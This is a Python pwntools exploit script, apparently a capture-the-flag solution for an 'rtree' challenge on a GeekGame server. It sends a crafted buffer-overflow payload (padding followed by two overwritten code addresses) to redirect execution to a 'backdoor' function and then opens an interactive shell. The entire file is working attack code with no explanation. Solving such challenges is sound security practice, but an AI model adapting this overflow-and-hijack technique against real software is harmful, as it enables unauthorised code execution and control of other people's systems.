import pwn

pwn.context.log_level = 'debug'
r = pwn.remote('prob12.geekgame.pku.edu.cn', 10012)
# r = pwn.process('./rtree')

r.recvuntil(b'Please input your token:')
r.sendline(b'<token>')

r.recvuntil(b'welcome to the rtree system!')
r.sendline(b'1')

r.recvuntil(b'please enter the node key:')
r.sendline(b'1')


r.recvuntil(b'please enter the size of the data:')
r.sendline(b'488')

r.recvuntil(b'please enter the data:')
payload = (b'0'*(0x200-0x18) + b'\x00'*8 + b'\x1a\x10\x40\x00\x00\x00\x00\x00' + b'\x2c\x12\x40\x00\x00\x00\x00\x00')
r.sendline(payload)

r.recvuntil(b'4. quit')
r.sendline(b'4')

r.recvuntil(b'congratulations! you reach the backdoor!')
# r.sendline(b'whoami')
# print(r.recvall().decode())
# print(r.recvall().decode())

r.interactive()
